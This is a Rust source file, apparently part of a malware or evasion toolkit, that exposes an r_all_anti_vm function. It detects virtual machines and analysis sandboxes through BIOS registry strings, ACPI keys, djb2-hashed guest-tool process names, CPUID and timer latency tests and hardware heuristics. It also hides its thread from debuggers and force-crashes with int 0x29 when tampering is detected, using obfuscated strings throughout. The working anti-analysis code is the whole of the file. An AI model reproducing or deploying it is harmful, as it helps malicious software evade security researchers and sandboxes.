#[cfg(target_os = "windows")]
const HKLM: isize = 0x80000002u32 as i32 as isize;

#[cfg(target_os = "windows")]
fn r_open_key(hkey: isize, subkey: &str) -> Option<isize> {
    extern "system" {
        fn RegOpenKeyExW(
            hKey: isize, lpSubKey: *const u16, ulOptions: u32,
            samDesired: u32, phkResult: *mut isize,
        ) -> i32;
    }
    unsafe {
        let wide: Vec<u16> = subkey.encode_utf16().chain(std::iter::once(0)).collect();
        let mut handle: isize = 0;
        if RegOpenKeyExW(hkey, wide.as_ptr(), 0, 0x20019, &mut handle) == 0 {
            Some(handle)
        } else {
            None
        }
    }
}

#[cfg(target_os = "windows")]
fn r_read_string(key: isize, value: &str) -> Option<String> {
    extern "system" {
        fn RegQueryValueExW(
            hKey: isize, lpValueName: *const u16, lpReserved: *mut u32,
            lpType: *mut u32, lpData: *mut u8, lpcbData: *mut u32,
        ) -> i32;
    }
    unsafe {
        let wname: Vec<u16> = value.encode_utf16().chain(std::iter::once(0)).collect();
        let mut t: u32 = 0;
        let mut sz: u32 = 0;
        if RegQueryValueExW(key, wname.as_ptr(), std::ptr::null_mut(), &mut t,
            std::ptr::null_mut(), &mut sz) != 0 || sz == 0 { return None; }
        let mut buf = vec![0u8; sz as usize];
        if RegQueryValueExW(key, wname.as_ptr(), std::ptr::null_mut(), &mut t,
            buf.as_mut_ptr(), &mut sz) != 0 { return None; }
        let wide: Vec<u16> = buf.chunks_exact(2)
            .map(|c| u16::from_le_bytes([c[0], c[1]])).collect();
        Some(String::from_utf16_lossy(&wide).trim_end_matches('\0').to_string())
    }
}

#[cfg(target_os = "windows")]
fn r_close(key: isize) {
    extern "system" { fn RegCloseKey(hKey: isize) -> i32; }
    unsafe { RegCloseKey(key); }
}

#[cfg(target_os = "windows")]
fn r_key_exists(hkey: isize, subkey: &str) -> bool {
    if let Some(h) = r_open_key(hkey, subkey) { r_close(h); true } else { false }
}

#[cfg(target_os = "windows")]
fn c_vendor() -> bool {
    const VM_STRINGS: &[&str] = &[
        "qemu", "bochs", "vmware", "virtualbox", "innotek",
        "seabios", "xen", "parallels", "kvm",
    ];

    let key = match r_open_key(HKLM, obfstr::obfstr!("HARDWARE\\DESCRIPTION\\System\\BIOS")) {
        Some(k) => k,
        None => return false,
    };

    let vm_in = |val: &str| -> bool {
        r_read_string(key, val)
            .map(|s| { let l = s.to_lowercase(); VM_STRINGS.iter().any(|&v| l.contains(v)) })
            .unwrap_or(false)
    };

    let found = vm_in(obfstr::obfstr!("SystemManufacturer"))
        || vm_in(obfstr::obfstr!("SystemProductName"))
        || vm_in(obfstr::obfstr!("BIOSVendor"));

    r_close(key);
    found
}

#[cfg(target_os = "windows")]
fn c_acpi_bochs() -> bool {
    r_key_exists(HKLM, obfstr::obfstr!("HARDWARE\\ACPI\\DSDT\\BOCHS_"))
    || r_key_exists(HKLM, obfstr::obfstr!("HARDWARE\\ACPI\\DSDT\\VBOX__"))
    || r_key_exists(HKLM, obfstr::obfstr!("HARDWARE\\ACPI\\DSDT\\XENSYS"))
}

#[cfg(target_os = "windows")]
fn c_sleep_deviation() -> bool {
    let mut total_ms = 0u64;
    for _ in 0..5 {
        let start = std::time::Instant::now();
        std::thread::sleep(std::time::Duration::from_millis(10));
        total_ms += start.elapsed().as_millis() as u64;
    }
    total_ms / 5 > 25
}

#[cfg(target_os = "windows")]
fn c_vm_processes() -> bool {
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };

    const fn djb2(s: &[u8]) -> u32 {
        let mut h: u32 = 5381;
        let mut i = 0;
        while i < s.len() {
            let c = if s[i] >= b'A' && s[i] <= b'Z' { s[i] + 32 } else { s[i] };
            h = h.wrapping_mul(33).wrapping_add(c as u32);
            i += 1;
        }
        h
    }

    const HASHES: [u32; 6] = [
        djb2(b"qemu-ga.exe"),
        djb2(b"vboxservice.exe"),
        djb2(b"vboxtray.exe"),
        djb2(b"vmtoolsd.exe"),
        djb2(b"vmwareuser.exe"),
        djb2(b"vmwaretray.exe"),
    ];

    unsafe {
        let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
            Ok(h) => h,
            Err(_) => return false,
        };

        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

        if Process32FirstW(snap, &mut entry).is_err() {
            let _ = windows::Win32::Foundation::CloseHandle(snap);
            return false;
        }

        loop {
            let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(entry.szExeFile.len());
            let mut bytes = [0u8; 260];
            let mut n = 0;
            for &c in &entry.szExeFile[..len] {
                if c < 128 {
                    bytes[n] = if c as u8 >= b'A' && c as u8 <= b'Z' { c as u8 + 32 } else { c as u8 };
                    n += 1;
                }
            }
            if HASHES.contains(&djb2(&bytes[..n])) {
                let _ = windows::Win32::Foundation::CloseHandle(snap);
                return true;
            }
            if Process32NextW(snap, &mut entry).is_err() { break; }
        }

        let _ = windows::Win32::Foundation::CloseHandle(snap);
        false
    }
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
mod timer {
    use std::sync::{Arc, atomic::{AtomicI32, AtomicU64, Ordering}};

    const ITER_XOR:   u64   = 50_000_000;
    const CPUID_ITER: usize = 100;
    const LEAVES: [u32; 11] = [
        0xB, 0xD, 0x4, 0x1, 0x7, 0xA, 0x12, 0x5,
        0x40000000, 0x80000008, 0x0,
    ];

    #[inline(always)]
    unsafe fn r_val() -> u64 { core::arch::x86_64::_rdtsc() }

    #[inline(always)]
    unsafe fn cpuid_latency(leaf: u32) -> u64 {
        use core::arch::x86_64::{_mm_lfence, _rdtsc, __cpuid, __rdtscp};
        use core::sync::atomic::{compiler_fence, Ordering::SeqCst};
        _mm_lfence();
        let t1 = _rdtsc();
        compiler_fence(SeqCst);
        let _ = std::hint::black_box(__cpuid(leaf));
        compiler_fence(SeqCst);
        let mut aux: u32 = 0;
        let t2 = __rdtscp(&mut aux);
        _mm_lfence();
        t2.wrapping_sub(t1)
    }

    fn i_hyperv() -> bool {
        #[allow(unused_unsafe)]
        let r1 = unsafe { core::arch::x86_64::__cpuid(1) };
        if r1.ecx & (1 << 31) == 0 { return false; }
        #[allow(unused_unsafe)]
        let r = unsafe { core::arch::x86_64::__cpuid(0x40000000) };
        r.ebx == 0x7263694d && r.ecx == 0x666f736f && r.edx == 0x76482074
    }

    unsafe fn s_affinity_self(core: usize) {
        use windows::Win32::System::Threading::{GetCurrentThread, SetThreadAffinityMask};
        let _ = SetThreadAffinityMask(GetCurrentThread(), 1 << core);
    }

    unsafe fn g_cpu_current_mhz() -> u32 {
        use windows::Win32::System::LibraryLoader::{GetModuleHandleA, LoadLibraryA, GetProcAddress};
        use windows::Win32::System::SystemInformation::GetSystemInfo;
        let mut si: windows::Win32::System::SystemInformation::SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut si);
        let n = si.dwNumberOfProcessors as usize;
        if n == 0 { return 0; }
        let hmod = match GetModuleHandleA(windows::core::s!("powrprof.dll")) {
            Ok(h) => h,
            Err(_) => match LoadLibraryA(windows::core::s!("powrprof.dll")) {
                Ok(h) => h, Err(_) => return 0,
            },
        };
        let fp = match GetProcAddress(hmod, windows::core::s!("CallNtPowerInformation")) {
            Some(f) => f, None => return 0,
        };
        type Fn = unsafe extern "system" fn(i32, *mut core::ffi::c_void, u32, *mut core::ffi::c_void, u32) -> i32;
        let f: Fn = std::mem::transmute(fp);
        #[repr(C)] struct PPI { _n: u32, _max: u32, cur: u32, _rest: [u32; 3] }
        let buf_sz = n * std::mem::size_of::<PPI>();
        let mut buf = vec![0u8; buf_sz];
        let s = f(11, std::ptr::null_mut(), 0, buf.as_mut_ptr() as *mut _, buf_sz as u32);
        if s < 0 { return 0; }
        (*(buf.as_ptr() as *const PPI)).cur
    }

    fn calculate_latency(samples_in: &[u64]) -> u64 {
        if samples_in.is_empty() { return 0; }
        let n = samples_in.len();
        if n == 1 { return samples_in[0]; }
        let mut s = samples_in.to_vec();
        s.sort_unstable();
        if n <= 4 { return s[0]; }

        let median_of = |v: &[u64], lo: usize, hi: usize| -> u64 {
            let len = hi - lo; if len == 0 { return 0; }
            let mid = lo + len / 2;
            if len & 1 == 1 { v[mid] } else { (v[mid - 1] + v[mid]) / 2 }
        };

        let m = median_of(&s, 0, n);
        let mut absdev: Vec<u64> = s.iter().map(|&x| if x > m { x - m } else { m - x }).collect();
        absdev.sort_unstable();
        let mad = median_of(&absdev, 0, absdev.len());
        let sigma: f64 = if mad == 0 { 1.0 } else { mad as f64 * 1.4826 };

        const MIN_WIN: usize = 10;
        let win = ((n as f64 * 0.08).ceil() as usize).max(MIN_WIN).min(n);
        let mut best_i = 0usize;
        let mut best_span = s[n - 1] - s[0] + 1;
        for i in 0..=(n.saturating_sub(win)) {
            let span = s[i + win - 1] - s[i];
            if span < best_span { best_span = span; best_i = i; }
        }

        const EXPAND: f64 = 1.5;
        let mut clo = best_i;
        let mut chi = best_i + win;
        let s3 = (3.0 * sigma).ceil() as u64;
        while clo > 0 {
            let ns = s[chi - 1] - s[clo - 1];
            if (ns as f64) <= EXPAND * best_span as f64 || s[chi-1] <= s[clo-1].saturating_add(s3) {
                clo -= 1; if ns < best_span { best_span = ns; }
            } else { break; }
        }
        while chi < n {
            let ns = s[chi] - s[clo];
            if (ns as f64) <= EXPAND * best_span as f64 || s[chi] <= s[clo].saturating_add(s3) {
                chi += 1; if ns < best_span { best_span = ns; }
            } else { break; }
        }

        let csz = if chi > clo { chi - clo } else { 0 };
        let frac = csz as f64 / n as f64;
        let min_c = (n / 50).max(5).min(n);

        if csz < min_c || frac < 0.02 {
            let fc = ((n as f64 * 0.10).floor() as usize).max(1);
            if fc == 1 { return s[0]; }
            let mid = fc / 2;
            return if fc & 1 == 1 { s[mid] } else { (s[mid-1] + s[mid]) / 2 };
        }

        let trim = (csz as f64 * 0.10).floor() as usize;
        let lo = clo + trim;
        let hi = chi.saturating_sub(trim);
        if hi <= lo { return median_of(&s, clo, chi); }

        let sum: f64 = s[lo..hi].iter().map(|&x| x as f64).sum();
        let mut result = (sum / (hi - lo) as f64).round() as u64;
        let diff = result as f64 - m as f64;
        if diff > 0.0 && diff > 6.0 * sigma { result = (m as f64 + 4.0 * sigma).round() as u64; }
        if result == 0 { s[0] } else { result }
    }

    pub fn check() -> bool {
        let have_rdtscp = core::arch::x86_64::__cpuid(0x80000001).edx & (1 << 27) != 0;
        if !have_rdtscp { return true; }

        let cycle_threshold: u64 = if i_hyperv() { 5000 } else { 2000 };

        let hw = std::thread::available_parallelism().map(|n| n.get()).unwrap_or(1);
        let samples_expected = LEAVES.len() * CPUID_ITER;

        for w in 0..128usize {
            let _ = std::hint::black_box(unsafe { cpuid_latency(LEAVES[w % LEAVES.len()]) });
        }

        let ready  = Arc::new(AtomicI32::new(0));
        let state  = Arc::new(AtomicI32::new(0));
        let t1_s   = Arc::new(AtomicU64::new(0));
        let t1_e   = Arc::new(AtomicU64::new(0));
        let t2_acc = Arc::new(AtomicU64::new(0));

        let (r1, s1, ts1, te1) = (ready.clone(), state.clone(), t1_s.clone(), t1_e.clone());
        let th1 = std::thread::spawn(move || {
            if hw >= 2 { unsafe { s_affinity_self(0); } }
            r1.fetch_add(1, Ordering::AcqRel);
            while r1.load(Ordering::Acquire) < 2 { std::hint::spin_loop(); }
            ts1.store(unsafe { r_val() }, Ordering::Release);
            s1.store(1, Ordering::Release);
            let mut x: u64 = 0xDEADBEEFCAFEBABE;
            for i in 0u64..ITER_XOR { x ^= i; x = (x << 1) ^ (x >> 3); }
            let _ = std::hint::black_box(x);
            te1.store(unsafe { r_val() }, Ordering::Release);
            s1.store(2, Ordering::Release);
        });

        let (r2, s2, ta2) = (ready.clone(), state.clone(), t2_acc.clone());
        let th2 = std::thread::spawn(move || -> Vec<u64> {
            if hw >= 2 { unsafe { s_affinity_self(1); } }
            r2.fetch_add(1, Ordering::AcqRel);
            while r2.load(Ordering::Acquire) < 2 { std::hint::spin_loop(); }
            let mut samples = vec![0u64; samples_expected];
            let mut last = unsafe { r_val() };
            let mut acc: u64 = 0;
            let mut idx = 0usize;
            let mut done = false;
            'outer: for &leaf in &LEAVES {
                for _ in 0..CPUID_ITER {
                    let now = unsafe { r_val() };
                    acc = acc.wrapping_add(now.wrapping_sub(last));
                    last = now;
                    if idx < samples.len() { samples[idx] = unsafe { cpuid_latency(leaf) }; }
                    idx += 1;
                    if s2.load(Ordering::Acquire) == 2 {
                        let fin = unsafe { r_val() };
                        acc = acc.wrapping_add(fin.wrapping_sub(last));
                        ta2.store(acc, Ordering::Release);
                        done = true;
                        break 'outer;
                    }
                }
            }
            if !done {
                while s2.load(Ordering::Acquire) != 2 { std::hint::spin_loop(); }
                let fin = unsafe { r_val() };
                acc = acc.wrapping_add(fin.wrapping_sub(last));
                ta2.store(acc, Ordering::Release);
            }
            samples
        });

        let _ = th1.join();
        let samples = match th2.join() { Ok(s) => s, Err(_) => return false };

        let t1_delta = {
            let a = t1_s.load(Ordering::Acquire);
            let b = t1_e.load(Ordering::Acquire);
            if b > a { b - a } else { 0 }
        };

        let used: Vec<u64> = samples.into_iter().filter(|&x| x != 0).collect();
        let lat = calculate_latency(&used);

        if lat >= cycle_threshold { return true; }
        if lat <= 25 { return true; }
        if t1_delta == 0 { return false; }

        let mhz = unsafe { g_cpu_current_mhz() };
        if mhz > 0 && mhz < 800 { return true; }

        false
    }
}

#[cfg(target_os = "windows")]
fn g_cpu_name() -> String {
    let key = match r_open_key(HKLM, obfstr::obfstr!("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0")) {
        Some(k) => k,
        None => return String::new(),
    };
    let name = r_read_string(key, obfstr::obfstr!("ProcessorNameString")).unwrap_or_default();
    r_close(key);
    name
}

#[cfg(target_os = "windows")]
fn g_gpu_name() -> String {
    for i in 0..4 {
        let subkey = std::format!("SYSTEM\\CurrentControlSet\\Control\\Class\\{{4d36e968-e325-11ce-bfc1-08002be10318}}\\{:04}", i);
        if let Some(key) = r_open_key(HKLM, &subkey) {
            if let Some(name) = r_read_string(key, "DriverDesc") {
                r_close(key);
                if !name.is_empty() {
                    return name;
                }
            }
            r_close(key);
        }
    }
    String::new()
}

#[cfg(target_os = "windows")]
fn c_custom_rules() -> bool {
    let cpu = g_cpu_name().to_lowercase();
    let gpu = g_gpu_name().to_lowercase();

    let (ram_mb, cores) = unsafe {
        use windows::Win32::System::SystemInformation::{GlobalMemoryStatusEx, GetSystemInfo, MEMORYSTATUSEX, SYSTEM_INFO};
        let mut mem_status: MEMORYSTATUSEX = std::mem::zeroed();
        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        let mb = if GlobalMemoryStatusEx(&mut mem_status).is_ok() {
            mem_status.ullTotalPhys / (1024 * 1024)
        } else {
            0
        };

        let mut sys_info: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut sys_info);

        (mb, sys_info.dwNumberOfProcessors)
    };

    let is_ms_basic_display = gpu.contains("microsoft basic display adapter");
    let is_4gb_ram = ram_mb >= 3500 && ram_mb <= 4500;

    if cpu.contains("skylake") && is_ms_basic_display {
        return true;
    }

    if cpu.contains("broadwell") {
        return true;
    }

    if cpu.contains("amd epyc 9534") && (is_ms_basic_display || is_4gb_ram) {
        return true;
    }

    if cores > 16 && is_4gb_ram {
        return true;
    }

    if ram_mb <= 2048 {
        return true;
    }

    false
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
fn c_timing_cross() -> bool {
    use core::arch::x86_64::__rdtscp;

    extern "system" {
        fn QueryInterruptTime(lpInterruptTime: *mut u64);
    }

    unsafe {
        let mut interrupt_before: u64 = 0;
        let mut interrupt_after: u64 = 0;

        let mut aux: u32 = 0;
        let tsc_start = __rdtscp(&mut aux);

        QueryInterruptTime(&mut interrupt_before);

        let mut x: u64 = 0xCAFEBABE;
        for i in 0u64..500_000 {
            x ^= i;
            x = x.wrapping_mul(0x5DEECE66D).wrapping_add(0xB);
        }
        let _ = std::hint::black_box(x);

        QueryInterruptTime(&mut interrupt_after);

        let tsc_end = __rdtscp(&mut aux);

        let tsc_delta = tsc_end.wrapping_sub(tsc_start);
        let interrupt_delta = interrupt_after.wrapping_sub(interrupt_before);

        if tsc_delta < 100 || interrupt_delta == 0 {
            return true;
        }

        let ratio = tsc_delta as f64 / interrupt_delta as f64;

        if ratio < 10.0 || ratio > 50000.0 {
            return true;
        }
    }

    false
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
fn c_sleep_acceleration() -> bool {
    use core::arch::x86_64::__rdtscp;

    extern "system" {
        fn QueryPerformanceCounter(lpPerformanceCount: *mut i64) -> i32;
        fn QueryPerformanceFrequency(lpFrequency: *mut i64) -> i32;
        fn SleepEx(dwMilliseconds: u32, bAlertable: i32) -> u32;
    }

    unsafe {
        let mut freq: i64 = 0;
        if QueryPerformanceFrequency(&mut freq) == 0 || freq <= 0 {
            return false;
        }

        let mut qpc_before: i64 = 0;
        let mut qpc_after: i64 = 0;

        QueryPerformanceCounter(&mut qpc_before);

        SleepEx(2, 0);

        QueryPerformanceCounter(&mut qpc_after);

        let mut aux: u32 = 0;
        let _tsc_after = __rdtscp(&mut aux);

        let qpc_delta = qpc_after - qpc_before;
        if qpc_delta <= 0 {
            return true;
        }

        let elapsed_us = (qpc_delta as f64 / freq as f64) * 1_000_000.0;

        if elapsed_us < 1500.0 {
            return true;
        }

        if elapsed_us > 50_000.0 {
            return true;
        }
    }

    false
}

#[cfg(target_os = "windows")]
#[allow(non_snake_case)]
fn c_thread_hiding() {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Threading::GetCurrentThread;

    type NtSetInformationThreadFn = unsafe extern "system" fn(
        ThreadHandle: isize,
        ThreadInformationClass: u32,
        ThreadInformation: *mut core::ffi::c_void,
        ThreadInformationLength: u32,
    ) -> i32;

    const THREAD_HIDE_FROM_DEBUGGER: u32 = 0x11;

    unsafe {
        let ntdll = match GetModuleHandleA(windows::core::s!("ntdll.dll")) {
            Ok(h) => h,
            Err(_) => return,
        };

        let proc = match GetProcAddress(ntdll, windows::core::s!("NtSetInformationThread")) {
            Some(p) => p,
            None => return,
        };

        let nt_set: NtSetInformationThreadFn = std::mem::transmute(proc);

        let thread = GetCurrentThread();

        let _status = nt_set(
            thread.0 as isize,
            THREAD_HIDE_FROM_DEBUGGER,
            std::ptr::null_mut(),
            0,
        );
    }
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[allow(non_snake_case)]
fn c_tampering() {
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Threading::GetCurrentThread;

    type NtQueryInformationThreadFn = unsafe extern "system" fn(
        ThreadHandle: isize,
        ThreadInformationClass: u32,
        ThreadInformation: *mut core::ffi::c_void,
        ThreadInformationLength: u32,
        ReturnLength: *mut u32,
    ) -> i32;

    const THREAD_HIDE_FROM_DEBUGGER: u32 = 0x11;

    unsafe {
        let ntdll = match GetModuleHandleA(windows::core::s!("ntdll.dll")) {
            Ok(h) => h,
            Err(_) => return,
        };

        let proc = match GetProcAddress(ntdll, windows::core::s!("NtQueryInformationThread")) {
            Some(p) => p,
            None => return,
        };

        let nt_query: NtQueryInformationThreadFn = std::mem::transmute(proc);

        let thread = GetCurrentThread();
        let mut hidden: u8 = 0;
        let mut ret_len: u32 = 0;

        let status = nt_query(
            thread.0 as isize,
            THREAD_HIDE_FROM_DEBUGGER,
            &mut hidden as *mut u8 as *mut core::ffi::c_void,
            1,
            &mut ret_len,
        );

        if status >= 0 && hidden == 0 {
            core::arch::asm!(
                "mov ecx, 5",
                "int 0x29",
                options(noreturn, nomem, nostack)
            );
        }
    }
}

#[cfg(target_os = "windows")]
pub fn r_all_anti_vm() -> bool {
    if c_vendor()          { return true; }
    if c_acpi_bochs()      { return true; }
    if c_sleep_deviation() { return true; }
    if c_vm_processes()    { return true; }
    if c_custom_rules()    { return true; }
    #[cfg(target_arch = "x86_64")]
    if timer::check()          { return true; }
    #[cfg(target_arch = "x86_64")]
    if c_timing_cross()    { return true; }
    #[cfg(target_arch = "x86_64")]
    if c_sleep_acceleration() { return true; }

    c_thread_hiding();

    #[cfg(target_arch = "x86_64")]
    c_tampering();
    false
}

#[cfg(not(target_os = "windows"))]
pub fn r_all_anti_vm() -> bool { false }
